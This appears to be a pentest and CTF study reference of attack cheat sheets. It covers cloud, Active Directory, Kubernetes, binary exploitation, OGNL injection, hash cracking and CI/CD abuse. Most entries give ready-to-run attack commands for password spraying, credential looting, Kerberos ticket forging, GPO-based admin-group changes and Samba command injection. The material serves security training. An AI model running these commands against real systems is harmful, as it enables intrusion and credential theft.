entries.brief: Find, list and loot misconfigured S3 buckets (public read/write and ACLs)
entries.body:
## Find bucket names
    # from the app: page source, JS, CORS/redirects, DNS CNAMEs to s3.amazonaws.com
    # guess: company, company-dev/-backup/-assets/-logs; tools: s3scanner, cloud_enum

## Test access (anonymous first)
    aws s3 ls s3://BUCKET --no-sign-request              # public list?
    aws s3 cp s3://BUCKET/file . --no-sign-request       # public read?
    curl https://BUCKET.s3.amazonaws.com/                # XML listing if public

## Writable buckets (high impact)
    aws s3 cp evil.html s3://BUCKET/ --no-sign-request   # public write -> defacement/stored payload
    aws s3api get-bucket-acl --bucket BUCKET --no-sign-request

## With found keys
    aws configure   # set AK/SK, then:
    aws sts get-caller-identity ; aws s3 ls ; enumerate-iam  # see what the creds can do

## Gotchas
- `--no-sign-request` tests anonymous access; many buckets block listing but allow object GET by name.
- Loot for creds/backups/configs in objects -> reuse against the app/infra.
- Leaked AWS keys (git/JS) -> check scope with get-caller-identity before anything else.

entries.title: Azure AD / Entra ID enumeration
entries.brief: Validate tenants and users, check conditional access, and enumerate with creds
entries.body:
## Unauthenticated tenant / user recon
    # tenant exists + federation info (no creds needed):
    https://login.microsoftonline.com/getuserrealm.srf?login=user@corp.com&xml=1
    curl 'https://login.microsoftonline.com/corp.com/.well-known/openid-configuration'
    # user existence (validate before spraying): o365spray / AADInternals Invoke-AADIntUserEnumeration

## Password spraying (lockout-aware)
    o365spray --spray -U users.txt -p 'Season2025!' --domain corp.com
    trevorspray -u users.txt -p 'Season2025!'      # (atlas) smart spray
    # watch Smart Lockout; Conditional Access/MFA may still block login

## Authenticated enumeration
    # az cli:
    az login ; az ad user list ; az ad group list ; az role assignment list --all
    # ROADtools (roadrecon) / AzureHound for full directory + graph of roles
    roadrecon gather ; roadrecon gui          # (atlas: roadrecon)
    azurehound -u user -p pass -t tenant      # BloodHound for Azure

## Gotchas
- getuserrealm/openid endpoints are unauth recon — tenant, federation, brand name.
- MFA/Conditional Access often blocks a valid cred -> look for legacy auth / app passwords.
- Managed identities and over-privileged app registrations are common escalation paths.

entries.title: Kubernetes — enumerate & abuse from a pod
entries.brief: Service-account token, API access, and common escapes after landing in a container
entries.body:
## You popped a pod — grab the token
    cat /var/run/secrets/kubernetes.io/serviceaccount/token    # SA JWT
    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
    env | grep KUBERNETES                                      # API host/port

## Talk to the API
    export T=$(cat .../token)
    kubectl --token=$T --server=https://K8S:443 --insecure-skip-tls-verify auth can-i --list
    # or raw: curl -k -H "Authorization: Bearer $T" https://K8S:443/api/v1/namespaces/.../pods

## Abuse over-permissive RBAC
    kubectl ... auth can-i create pods          # yes? schedule a pod that mounts the host
    kubectl ... get secrets -A                  # read cluster secrets (creds/tokens)
    # create a privileged/hostPath pod -> read host fs -> node compromise

## Enumerate & automate
    kube-hunter --remote K8S ; peirates ; kubectl get nodes,pods,secrets -A   # (atlas entries)

## Container -> host (if misconfigured)
    # privileged pod / hostPath / docker.sock -> escape (see container-escapes, docker-group-privesc)

## Gotchas
- The default SA token may have minimal rights — always run `auth can-i --list` first.
- `get secrets` across namespaces is the usual jackpot (DB creds, cloud keys).
- `create pods` ~= node root via a hostPath/privileged pod; check it early.

entries.title: Hash cracking workflow
entries.brief: Identify the hash, pick the mode, then dictionary/rules/mask with hashcat or john
entries.body:
## 1. Identify the hash
    nth -t '<hash>'        # name-that-hash (best); or hashid, haiti
    # note length/format: 32 hex=MD5/NTLM, $6$=sha512crypt, $2y$=bcrypt, $krb5tgs$=kerberoast...

## 2. Find the hashcat mode
    hashcat --example-hashes | grep -i <type>      # map type -> -m number
    # common: 0 MD5, 100 SHA1, 1000 NTLM, 1800 sha512crypt, 3200 bcrypt,
    #         5600 NetNTLMv2, 13100 Kerberoast, 18200 AS-REP, 22000 WPA (see hash-mode-reference)

## 3. Dictionary first
    hashcat -m <mode> hashes.txt rockyou.txt
    john --format=<fmt> --wordlist=rockyou.txt hashes.txt

## 4. Add rules, then masks
    hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
    hashcat -m <mode> hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d!'   # brute a pattern (see rules-and-masks)

## 5. Manage & resume
    hashcat ... --status --status-timer 10 ; hashcat --restore ; hashcat --show hashes.txt
    # tune -w 3 (workload), -O (optimized, length-limited)

## Gotchas
- Match the exact format: NTLM(1000) vs NetNTLMv2(5600) vs NTLMv1 are different modes.
- bcrypt/sha512crypt are SLOW -> small targeted wordlist + rules beats brute.
- Use `--username` when the file is user:hash; strip usernames otherwise.
- See **cracking-rules-and-masks**, **hash-mode-reference**, atlas **hashcat**/**john**/**name-that-hash**.

entries.title: Building targeted wordlists
entries.brief: Scrape, mutate and combine to make password lists tuned to the target
entries.body:
## Scrape the target's own words
    cewl -d 3 -m 5 -w site.txt http://target          # words from the website
    cewl --with-numbers http://target                  # include numbered variants

## Profile a person / org (OSINT)
    cupp -i          # interactive: name, pet, dates -> likely passwords
    # combine with company name, product names, seasons, local sports teams

## Mutate with rules (don't pre-expand huge lists)
    hashcat --stdout site.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
    # append years/symbols patterns; or apply rules live during cracking (preferred)

## Keyspace / pattern generators
    crunch 8 8 -t Pass@%%%% -o crunch.txt             # fixed pattern (see atlas: crunch)
    kwprocessor / maskprocessor                        # keyboard-walks and masks

## Combine & dedupe
    cat site.txt cupp.txt rockyou.txt | sort -u > final.txt
    hashcat -a 1 left.txt right.txt                    # combinator attack

## Gotchas
- Prefer rules/masks applied DURING cracking over writing giant files to disk.
- A 500-word CeWL list + best64 rules often beats a generic 14M-line list on a themed target.
- Seasons+year and Company+year (Autumn2025!, Acme2025!) are perennial winners for spraying.
- See **password-spraying-ad**, atlas **cewl**/**crunch**/**cupp**.

entries.title: Steganography & file triage (CTF)
entries.brief: The ordered checks for hidden data in images, audio and odd files
entries.body:
## 1. Identify & look inside
    file suspicious ; exiftool suspicious        # true type + metadata (comments/GPS/author)
    strings -n 6 suspicious | less               # flags, URLs, hints
    binwalk suspicious                           # embedded files/archives
    binwalk -e suspicious ; foremost suspicious  # carve them out

## 2. Images
    zsteg image.png            # LSB stego in PNG/BMP
    steghide extract -sf image.jpg   # JPG (asks for passphrase)
    stegseek image.jpg rockyou.txt   # brute the steghide passphrase fast
    # also: compare planes/palette (stegsolve), check for appended data after EOF

## 3. Audio / other
    # spectrogram (Audacity/sox) for hidden text in WAV; look at LSB too
    # QR fragments, zip-in-image (binwalk), polyglot files

## 4. Archives / passwords
    fcrackzip -D -p rockyou.txt file.zip ; zip2john file.zip > h ; john h
    pdfcrack / pdfid for PDFs

## Gotchas
- `file` says PNG but it won't open? check the magic bytes and for appended data (strings/binwalk).
- Always run exiftool + strings first — the flag is often just sitting in metadata.
- See atlas **binwalk**/**exiftool**/**zsteg**/**steghide**/**stegseek**/**foremost**.

entries.title: PCAP analysis — extract creds, files and flags
entries.brief: Work a packet capture with wireshark/tshark to recover data and credentials
entries.body:
## Open & orient
    wireshark capture.pcap        # GUI: Statistics > Protocol Hierarchy / Conversations
    tshark -r capture.pcap -q -z io,phs      # protocol breakdown on the CLI

## Follow streams / find plaintext
    # Wireshark: right-click a packet > Follow > TCP/HTTP Stream
    tshark -r cap.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
    tshark -r cap.pcap -Y 'ftp || telnet || http.authorization' -T fields -e _ws.col.Info

## Pull credentials
    # plaintext: HTTP basic (base64 in Authorization), FTP/telnet USER/PASS, POP/IMAP
    # NetNTLM/Kerberos hashes: use Wireshark NTLMSSP fields or pcredz:
    pcredz -f capture.pcap        # auto-extracts hashes/creds (atlas: pcredz)

## Carve transferred files
    # Wireshark: File > Export Objects > HTTP/SMB/TFTP
    tshark -r cap.pcap --export-objects http,out/
    foremost -i cap.pcap          # carve by signature as a fallback

## Gotchas
- Filter early: `http`, `ftp`, `dns`, `smb2`, `tcp.port==...` to cut noise.
- TLS is opaque without keys; look for a leaked SSLKEYLOGFILE or pre-master secret in the challenge.
- See atlas **tshark**/**tcpdump**/**ngrep**/**pcredz**.

entries.title: Memory forensics with Volatility 3
entries.brief: Pull processes, creds, commands and files out of a RAM dump
entries.body:
## Orient
    vol -f mem.raw windows.info          # OS/build (vol3 auto-detects; no profile needed)
    vol -f mem.raw windows.pslist        # running processes
    vol -f mem.raw windows.pstree        # parent/child (spot injected/odd procs)

## Credentials
    vol -f mem.raw windows.hashdump      # SAM NT hashes -> crack/PtH
    vol -f mem.raw windows.lsadump / windows.cachedump
    # mimikatz-style secrets if the plugin/symbols are available

## What happened
    vol -f mem.raw windows.cmdline       # process command lines (creds/args)
    vol -f mem.raw windows.netscan       # connections/listeners
    vol -f mem.raw windows.filescan | grep -i flag   # find files in memory
    vol -f mem.raw windows.dumpfiles --viraddr <addr>   # extract one

## Linux dumps
    vol -f mem.raw linux.bash           # bash history ; linux.pslist, linux.pstree

## Gotchas
- Volatility 3 needs no profile but may need symbols for the exact kernel/build.
- hashdump/cmdline are the usual CTF wins; grep filescan for the flag filename.
- See atlas **volatility3**.

entries.title: Format string vulnerabilities
entries.brief: Leak memory with %x/%p and write with %n when user input reaches printf
entries.body:
## The bug
User input used AS the format string: `printf(user)` instead of `printf("%s", user)`. The format
specifiers then read/write the stack and beyond.

## Detect
    # send format specifiers; if they're interpreted, it's vulnerable:
    input: AAAA.%p.%p.%p.%p.%p      # leaks stack values (and your AAAA = 41414141)
    input: %x %x %x %x

## Read (leak) primitives
    %N$p            # direct param access: read the Nth stack value
    # leak libc/stack/canary addresses to defeat ASLR/stack-canary
    # read a string at an address: place addr, then %N$s

## Write primitive (%n)
    %n writes the number of bytes printed so far to a pointed-at address.
    # overwrite a GOT entry / return addr / __malloc_hook:
    pwntools: fmtstr_payload(offset, {got_addr: target})   # builds it for you

## Workflow (pwntools)
    1. find the offset (where your input sits): send %p's, see where AAAA/0x4141.. appears
    2. leak what you need (libc base, canary)
    3. use fmtstr_payload to overwrite GOT -> redirect to system/one_gadget

## Gotchas
- Count the offset carefully (32-bit stack vs 64-bit register args differ).
- `%n` is often what gives code exec; some libc builds restrict it (FORTIFY).
- See **rop-chaining**, **buffer-overflow-linux**, atlas **pwntools**/**gdb**/**one_gadget**.

entries.title: ROP — return-oriented programming basics
entries.brief: Chain existing gadgets to bypass NX: ret2libc, stack pivots and syscall chains
entries.body:
## Why ROP
With NX/DEP the stack isn't executable, so you can't just jump to shellcode. Instead chain small
existing code snippets ('gadgets' ending in `ret`) to do the work.

## Find gadgets
    ropper --file ./bin --search 'pop rdi; ret'      # atlas: ropper
    ROPgadget --binary ./bin | grep 'pop rdi'        # atlas: ROPgadget

## ret2libc (the classic)
    # call system('/bin/sh') using libc:
    64-bit: payload = pad + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
    32-bit: payload = pad + p32(system) + p32(exit) + p32(binsh)
    # ret alignment (extra `ret`) fixes movaps crashes on 64-bit

## Leak then exploit (ASLR/PIE)
    1. leak a libc address (puts(puts@got) via a ROP call), read it
    2. compute libc base -> system/'/bin/sh' real addresses
    3. second-stage ROP calls system('/bin/sh')

## pwntools makes it clean
    from pwn import *
    rop = ROP(elf); rop.call('system', [next(libc.search(b'/bin/sh'))])
    # ROP object auto-finds gadgets and builds the chain

## Gotchas
- 64-bit passes args in registers -> you need pop rdi/rsi/rdx gadgets, not stack args.
- Stack canary present -> leak it first (see format-string-exploit) and replace it.
- No useful gadgets in the bin? pull them from libc after a leak. See **buffer-overflow-linux**.

entries.title: OGNL injection
entries.brief: Object-Graph Navigation Language injection in Struts/Confluence and other Java apps
entries.body:
## Where it shows up
OGNL evaluates `%{...}` / `${...}` expressions in Apache Struts, Confluence, and other Java stacks.
When user input reaches an OGNL evaluator, it executes Java -> RCE. It's the engine behind several
big CVEs (see struts-ognl-rce, confluence-ognl-rce).

## Detect
    %{7*7}   ${7*7}   %{(123+456)}        # 49 / 579 reflected = OGNL evaluated
    # test in URL params, headers (Content-Type for S2-045), and path segments

## To RCE (modern Struts gadget shape)
    # public PoCs set #_memberAccess to the default context, then exec:
    %{(#a=@java.lang.Runtime@getRuntime().exec('id')).(...read output...)}
    # prefer a maintained PoC over hand-building; see struts-ognl-rce

## Confluence (CVE-2022-26134 shape)
    # unauth OGNL via a crafted URL path:
    curl 'http://t/%24%7B(...OGNL...)%7D/'         # URL-encoded ${...}

## Relationship to EL/SpEL/SSTI
OGNL, EL, SpEL and template SSTI are the same 'expression reaches evaluator' family — if one
syntax is filtered, try the others. See **el-injection**, **ssti-to-rce**.

## Gotchas
- WAFs filter `%{`, `@java`, `getRuntime` -> obfuscate (see waf-evasion).
- Match the gadget to the framework version; `#_memberAccess` handling changed across Struts releases.
- Blind? confirm with an **oob-callbacks** DNS/HTTP canary.

entries.title: Kerberos unconstrained delegation
entries.brief: A host trusted for unconstrained delegation caches TGTs you can capture and reuse
entries.body:
## What it is
A computer/user set for UNCONSTRAINED delegation stores the TGT of anyone who authenticates to it.
If you control such a host, coerce a privileged account (even a DC) to auth to it, then extract and
reuse its TGT.

## Find it
    impacket-findDelegation corp.local/user:pass           # lists delegation configs
    # BloodHound: 'AllowedToDelegate' / TRUSTED_FOR_DELEGATION ; PowerView Get-NetComputer -Unconstrained

## Abuse (you own an unconstrained host)
    1. monitor for incoming TGTs:  Rubeus.exe monitor /interval:5   (or krbrelayx on Linux)
    2. coerce a DC to authenticate to your host (see coercion-techniques: printerbug/petitpotam)
    3. the DC's TGT lands in memory -> extract it (Rubeus/mimikatz) or krbrelayx catches it
    4. pass-the-ticket as the DC$ -> DCSync (see pass-the-ticket / dcsync)

## Gotchas
- DCs are unconstrained by default; the prize is coercing a DC's TGT to your controlled host.
- krbrelayx (atlas) does the capture on Linux; Rubeus monitor does it on Windows.
- See **kerberos-delegation** map, **coercion-techniques**, **constrained-delegation**.

entries.title: Kerberos constrained delegation (S4U)
entries.brief: An account allowed to delegate to a service can impersonate any user to that service
entries.body:
## What it is
Constrained delegation lets an account request tickets TO a specified service ON BEHALF OF another
user (S4U2Self + S4U2Proxy). If you control such an account, you can impersonate e.g. Administrator
to the target service (CIFS/HTTP/MSSQL...).

## Find it
    impacket-findDelegation corp.local/user:pass      # shows 'msDS-AllowedToDelegateTo'
    # note the account's password/hash AND the allowed SPNs

## Abuse
    impacket-getST -spn cifs/target.corp.local -impersonate Administrator \
      corp.local/svc_account -hashes :<NThash>
    export KRB5CCNAME=Administrator.ccache
    impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
    # Windows: Rubeus.exe s4u /user:svc /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target

## Protocol transition & SPN swap
- With 'protocol transition' (TrustedToAuthForDelegation) you don't even need the user's auth.
- The service part of the SPN can often be swapped (cifs->host->http) to reach other services.

## Gotchas
- You need the delegating account's hash/password first (crack/dump it).
- `-impersonate` a user who isn't 'Protected Users' / sensitive-flagged.
- See atlas **impacket-getST**/**impacket-findDelegation**/**rubeus**; **resource-based-delegation**.

entries.title: Resource-based constrained delegation (RBCD)
entries.brief: Write access to a computer object lets you configure delegation and impersonate to it
entries.body:
## What it is
RBCD is configured on the TARGET (msDS-AllowedToActOnBehalfOfOtherIdentity). If you can WRITE that
attribute on a computer (GenericWrite/GenericAll/WriteProperty), you set a machine account you
control as allowed-to-act, then impersonate any user to that computer.

## Prereqs
    # 1. an account with a SPN you control. If none, create one (MachineAccountQuota>0 default 10):
    impacket-addcomputer -computer-name EVIL$ -computer-pass 'Pass123' corp.local/user:pass  # (atlas: powermad on Windows)
    # 2. write access to the target computer object (BloodHound shows the edge)

## Configure + abuse
    impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write corp.local/user:pass
    impacket-getST -spn cifs/target.corp.local -impersonate Administrator \
      corp.local/EVIL$ -hashes :<EVIL_NThash>
    export KRB5CCNAME=Administrator.ccache ; impacket-psexec -k -no-pass Administrator@target.corp.local

## Gotchas
- MachineAccountQuota=0 blocks creating EVIL$ -> reuse an existing controlled computer/SPN account.
- You impersonate TO the target you have write on; pick a high-value host.
- This is the most common 'ACL write -> SYSTEM on a host' path; see **ad-acl-edges**, atlas **bloodyAD**/**impacket-getST**.

entries.title: The enumeration mindset
entries.brief: Why 'enumerate again' beats 'exploit harder' — the core OSCP habit
entries.body:
## The one rule
Enumeration is 80% of the work. Most 'stuck' moments are a missed service, port, vhost, parameter,
file, or credential — not a missing exploit. When stuck, the answer is almost always MORE enum.

## Breadth before depth
    - scan ALL ports first (nmap -p-), then -sV/-sC the open ones; don't stop at top-1000
    - UDP matters (SNMP/TFTP/IKE/NTP) -> nmap -sU on common UDP ports
    - every web service: vhosts, dirs, params, source, JS, robots, headers, 'view-source'

## Follow every thread
    - a version number -> searchsploit it
    - a username/email -> spray & roast it
    - a password/hash -> try it EVERYWHERE (see credential-reuse-strategy)
    - a file/share -> read it fully; configs and backups hold creds

## Re-enumerate after every change
After a foothold or new creds, enumerate AGAIN with that access: authenticated SMB/LDAP, internal
ports, new shares, sudo -l, new hosts reachable from here.

## Gotchas
- 'Nothing here' usually means 'I didn't look hard enough' — re-run with different wordlists/flags.
- Note what you've tried so you don't loop (see note-taking-strategy).
- Automate the first pass (autorecon) but READ the output; tools miss context you won't.

entries.title: Avoiding rabbit holes
entries.brief: Recognise and escape dead ends before they eat your exam
entries.body:
## What a rabbit hole looks like
    - hammering one exploit/port for an hour with no new information
    - tweaking a payload endlessly instead of questioning the approach
    - a 'vuln' that's actually a decoy/intended distraction

## Timeboxing
    - give any single lead ~30-45 min; if no PROGRESS (not success, progress), move on
    - 'progress' = new info: a different error, a new path, a partial result
    - set a timer; it's easy to lose 3 hours without noticing

## Escape moves (do these before quitting a target)
    1. re-read ALL your enum output for this box — slowly
    2. re-enumerate with different wordlists/flags/UDP
    3. switch targets; come back with fresh eyes (often the fix is obvious later)
    4. question the assumption: 'what if this isn't the intended path?'

## Signals you're IN one
    - you can't explain WHY the next step should work
    - you're copying payloads without understanding them
    - you've stopped taking notes

## Gotchas
- The exam rewards breadth: a second box's local.txt beats hour 4 on one privesc.
- Rabbit holes are often deliberately placed — a working-looking path that leads nowhere.
- See **exam-time-management**, **enumeration-mindset**.

entries.title: Vulnerability scanning — when and how
entries.brief: Use scanners to triage, not to think; targeted beats spray-and-pray
entries.body:
## Scanners triage; you exploit
Automated scanners surface candidates fast but miss logic/context and cry wolf. Use them to narrow,
then verify and exploit by hand.

## The right order
    1. nmap version + default scripts:  nmap -sVC -p<open> TARGET
    2. targeted NSE:  nmap --script 'smb-vuln-*' / 'http-*' -p... TARGET
    3. web: nikto for quick wins, then nuclei with relevant templates (not everything)
    4. ALWAYS: searchsploit the exact product+version you found

## nuclei, used well
    nuclei -u http://t -tags cve,exposure,misconfig     # not the whole template set blindly
    nuclei -l live.txt -severity critical,high          # triage many hosts

## OSCP note
    - automated exploitation tools are RESTRICTED on the exam; scanners for ENUM are fine
    - know the manual verification for anything a scanner flags

## Gotchas
- False positives are common -> confirm a finding before you report/exploit it.
- Don't let nuclei/nikto replace reading the app; the intended path is often logic, not a CVE.
- searchsploit on the precise version beats any generic scan. See **vulnerability-scanning** if present.

entries.title: Samba exploitation (Linux SMB)
entries.brief: Version CVEs, usermap_script, symlink traversal and writable-share RCE on Samba
entries.body:
## Fingerprint the Samba version
    nmap -p139,445 --script smb-os-discovery TARGET      # 'Unix Samba x.y.z'
    # map the version to a CVE:
    searchsploit samba <version>

## usermap_script (CVE-2007-2447) — Samba 3.0.20-3.0.25rc3
    # command injection via the username field in the map script:
    # Metasploit: exploit/multi/samba/usermap_script  (or a manual smbclient login with
    #   username = `/=`nohup <cmd>`` ) -> RCE as root

## Writable share -> RCE / loot
    smbmap -H TARGET -u user -p pass       # find WRITE shares
    # drop a webshell if the share maps to a webroot; or plant scripts a cron/service runs

## Symlink directory traversal
    # if 'wide links'/'follow symlinks' is on, create a symlink inside a writable share to /
    smbclient //TARGET/share -c 'symlink / rootfs; get rootfs/etc/shadow'

## Other classics
    - SambaCry (CVE-2017-7494): malicious .so uploaded to a writable share + loaded -> RCE
    - anonymous/guest shares leaking creds and configs (see smb-enumeration)

## Gotchas
- Always version-match the CVE; usermap_script only hits that narrow 3.0.x range.
- SambaCry needs a writable share AND the server to load the module (right path/perms).
- Enumerate shares/perms first (see **smb-enumeration**); writable+web = easiest RCE.

entries.title: Web content discovery — which tool when
entries.brief: The one-place decision guide: fuzz vs crawl vs param/API discovery vs manual proxy
entries.body:
## Decide by GOAL, not habit
Four different jobs need four different tool classes. Ask what you're actually doing:
- **Guess** hidden paths/files nothing links to (/admin, /backup.zip, /api/) -> directory/content FUZZER
- **Follow** what the app references (links, forms, JS endpoints) -> CRAWLER
- **Find inputs** a path scan won't reveal (hidden params, API routes) -> PARAMETER/API discovery
- **Validate & manually test** a finding (auth, logic, tamper) -> interactive PROXY

## Decision matrix
| Situation | Tool class | Reach for | Atlas |
|---|---|---|---|
| Unlinked dirs/files | dir fuzzer | ffuf / feroxbuster / gobuster / dirsearch | oscp atlas ffuf |
| Recursive dir discovery | dir fuzzer | feroxbuster (auto-recurses) | oscp atlas feroxbuster |
| Virtual hosts / subdomains | dir fuzzer | gobuster vhost/dns, ffuf -H Host | oscp atlas gobuster |
| Map linked content + JS endpoints | crawler | katana / hakrawler / gospider | oscp atlas katana |
| Hidden request parameters | param disc | arjun / x8 / paramspider | oscp atlas arjun |
| Undocumented API routes | api disc | kiterunner | oscp atlas kiterunner |
| WordPress target | CMS scanner | wpscan | oscp atlas wpscan |
| Identify the stack first | fingerprint | whatweb / wappalyzer | oscp atlas whatweb |
| Validate / tamper / auth flows | proxy | Burp Suite / ZAP | oscp atlas burpsuite |

## The minimal toolkit (don't chase all of them)
You do NOT need every tool. Master these and you cover the techniques:
- **gobuster** - fundamentals of directory, DNS and vhost enumeration
- **feroxbuster** - recursion and response filtering
- **ffuf** - flexible fuzzing: FUZZ anywhere, match/filter by status/size/words/regex
- **katana** - crawling, so you feel the difference between following links and guessing paths
- **burpsuite** - validate findings and inspect/replay requests manually
- **wpscan** - specifically for WordPress-hosted apps
Learn another tool only when a specific target or limitation gives you a reason.

## Progressive workflow (order on a web target)
    1. Fingerprint:   whatweb http://t ; check headers, /robots.txt, view-source
    2. Crawl FIRST:   katana -u http://t -jc    (harvest real URLs + params from pages/JS)
    3. Then FUZZ gaps: ffuf -u http://t/FUZZ -w seclists... -mc 200,301,302,403
                       feroxbuster -u http://t   (recursion for nested dirs)
    4. Vhost/DNS:     gobuster vhost -u http://t -w subs.txt   (if host-based routing)
    5. Params/API:    arjun -u http://t/page ; paramspider -d t ; kiterunner for API routes
    6. Tech-specific: wpscan --url http://t -e vp,vt,u   (WordPress), etc.
    7. Validate:      drive the promising requests through Burp/ZAP (Repeater/Intruder), test logic

## Why crawl BEFORE you fuzz
Crawling gives you the app's REAL endpoints and parameter names. Feeding those into your fuzzer
(and extending with /admin, /backup, recursion) makes discovery targeted instead of blind. Guessing
alone misses linked-but-deep content; crawling alone misses unlinked/forgotten files. Use both.

## Picking inside a class (quick tie-breakers)
- **ffuf vs gobuster vs feroxbuster**: ffuf = most flexible (FUZZ in path/param/header/Host/body,
  rich matching); feroxbuster = best default recursion; gobuster = simple, fast, great for vhost/dns.
- **katana vs hakrawler vs gospider**: katana = modern/thorough (JS, headless); hakrawler/gospider =
  lightweight pipeline crawlers. Any one is fine; know one well.
- **arjun vs x8 vs paramspider**: arjun/x8 = active param brute; paramspider = passive (archived URLs).

## Gotchas
- Wordlist matters more than the tool: use SecLists (raft/common) and the right one per job.
- Filter noise: ffuf -fc/-fs/-fw, feroxbuster -C/-S; a wall of 200s usually means a soft-404.
- 403/401 on a found path? try bypasses (see atlas: dontgo403) before giving up.
- See the 360 'which tool, why' table in **tool-selection**, and the method in **oscp methods show attack-http**.

entries.title: GPO abuse — writable Group Policy to code exec
entries.brief: Edit rights on a GPO let you push a task/script to every object in its scope
entries.body:
## The idea
A Group Policy Object applies to many computers/users. If your principal can EDIT a GPO (BloodHound
shows a `GenericWrite`/`WriteDacl`/`GPO` edge), you can add an immediate scheduled task or startup
script that runs on every object the GPO is linked to -> mass code exec, often SYSTEM.

## Find it
    # BloodHound: an edge to a GPO, or 'Affected Objects' of a GPO you control
    Get-DomainGPO | select displayname, name ; Get-DomainOU   # PowerView: what it applies to

## Abuse
    # Windows (SharpGPOAbuse, atlas):
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author x \
      --Command cmd.exe --Arguments '/c net localgroup administrators me /add' --GPOName 'Policy'
    # Linux (pyGPOAbuse): pygpoabuse corp.local/user:pass -gpo-id <GUID> -command '...'
    gpupdate /force   # or wait for the refresh cycle (~90 min)

## Scope matters
    # link the task where it hits a high-value host; some GPOs apply to the whole domain/DCs

## Gotchas
- You need the write to apply to a GPO that's actually LINKED to useful objects.
- Policy refresh is ~90 min unless you can force gpupdate; plan for the delay.
- Clean up the task/entry afterwards. See atlas **sharpgpoabuse**, **ad-acl-edges**.

entries.title: gMSA / read managed service-account passwords
entries.brief: If you can read a gMSA's blob, derive its password and act as that service account
entries.body:
## What a gMSA is
A group Managed Service Account has an auto-rotating password stored in AD
(`msDS-ManagedPassword`). Only principals in `msDS-GroupMSAMembership` can read it — but those
accounts (or an ACL you can abuse to add yourself) let you recover the password/NT hash.

## Find who can read it
    # BloodHound: 'ReadGMSAPassword' edge to the gMSA
    Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword

## Read & derive the password
    gMSADumper.py -u user -p pass -d corp.local        # (atlas: gMSADumper) -> NT hash
    nxc ldap DC -u user -p pass --gmsa                 # dump readable gMSA hashes
    bloodyAD -u user -p pass -d corp.local get object 'svc_gmsa$' --attr msDS-ManagedPassword

## Use it
    # the derived NT hash -> pass-the-hash / request tickets as the gMSA (see pass-the-hash)
    nxc smb TARGET -u 'svc_gmsa$' -H <NThash>

## Gotchas
- gMSAs are often privileged (service identities) -> a strong lateral/escalation step.
- If you only have a WRITE ACL on the membership attribute, add yourself first, then read.
- Password auto-rotates (~30 days) but the hash you pull is current. See **ad-acl-edges**.

entries.title: Golden ticket (krbtgt forging) — reference
entries.brief: The krbtgt hash lets you forge TGTs for any user; what it is, needs, and detection
entries.body:
## What it is
A golden ticket is a forged Kerberos TGT signed with the domain's **krbtgt** account hash. With it
you can impersonate ANY user (incl. a fake Domain Admin) for a long period. It's post-compromise
domain PERSISTENCE/impersonation, not an initial-access exploit.

## Prerequisites (you must already own the domain)
    # the krbtgt NT hash (or AES key) + the domain SID
    # get krbtgt via DCSync once you have replication rights (see dcsync):
    impacket-secretsdump -just-dc-user krbtgt corp.local/da:pass@DC
    # domain SID: nxc / lookupsid / 'whoami /user' and strip the RID

## Forge & use (tooling)
    impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain corp.local Administrator
    export KRB5CCNAME=Administrator.ccache
    impacket-psexec -k -no-pass corp.local/Administrator@target   # use the forged TGT
    # Windows: mimikatz kerberos::golden /user:... /krbtgt:... /sid:... /ptt

## Silver ticket (narrower cousin)
    # forge a SERVICE ticket (TGS) using a SERVICE account's hash -> access just that service,
    #   no DC contact. Needs the service (machine/svc) hash, not krbtgt.

## Gotchas / why it matters
- Rotating krbtgt ONCE does not invalidate golden tickets; it must be rotated TWICE (defender note).
- It needs domain-level compromise first (krbtgt) — it's persistence, not a shortcut to DA.
- Loud to a tuned SIEM (anomalous TGT lifetimes/PAC). See **dcsync**, **kerberos-attacks-map**.

entries.title: KeePass database looting & cracking
entries.brief: Find .kdbx files, crack the master password, and dump stored credentials
entries.body:
## Find the database + any keyfile
    find / -name '*.kdbx' 2>/dev/null ; dir /s /b *.kdbx    # Linux / Windows
    # also look for a .key/.keyx keyfile next to it (part of the master credential)

## Crack the master password
    keepass2john Database.kdbx > hash.txt        # (atlas: keepass2john)
    # strip the filename prefix if needed; then:
    hashcat -m 13400 hash.txt rockyou.txt        # KeePass 1/2
    john --format=keepass hash.txt
    # keyfile-protected: keepass2john -k keyfile Database.kdbx

## Open & dump once cracked
    keepassxc-cli open Database.kdbx ; keepassxc-cli ls/show -s   # (atlas: keepassxc)
    # export all entries incl. passwords for reuse

## CVE shortcut (KeePass 2.x < 2.54)
    # CVE-2023-32784: recover most of the master password from a memory dump/process
    # (keepass-password-dumper) if you have a dump of a running KeePass

## Gotchas
- KeePass KDF is deliberately slow -> use a targeted wordlist + rules, not raw brute.
- A keyfile is REQUIRED alongside the password if one was set; find it or you can't open it.
- Dumped entries -> credential reuse everywhere (see credential-reuse-strategy).

entries.title: CI/CD attacks — Jenkins, GitLab, pipelines
entries.brief: Abuse build systems and pipeline config for RCE, secrets and lateral movement
entries.body:
## Why CI/CD is high-value
Build servers run code by design, hold deployment credentials, and reach internal networks — owning
the pipeline often means owning everything it deploys to.

## Jenkins
    # Script Console (admin): Manage Jenkins > Script Console -> Groovy RCE:
    println 'id'.execute().text
    # also: unauth/weak creds, Groovy build step, credentials.xml loot, agent takeover
    # (see jenkins-exploitation)

## GitLab
    # .gitlab-ci.yml controls the runner -> push a job that runs your commands on the runner
    # CI/CD variables often hold deploy tokens/cloud keys (Settings > CI/CD > Variables)
    # version CVEs: searchsploit gitlab (see gitlab-exploitation)

## Pipeline config as an attack surface
    # a repo you can commit to that has CI -> add a malicious job/step -> runs in CI with its secrets
    # poisoned pipeline execution (PPE): modify build scripts, dependencies, or test hooks
    # protected branches/approvals are the control that stops this

## Loot to grab from any build host
    env | grep -iE 'token|key|secret' ; ~/.docker/config.json ; kube configs ; cloud creds ; .git-credentials

## Gotchas
- CI secrets are the real prize even without full RCE — dump variables/credential stores.
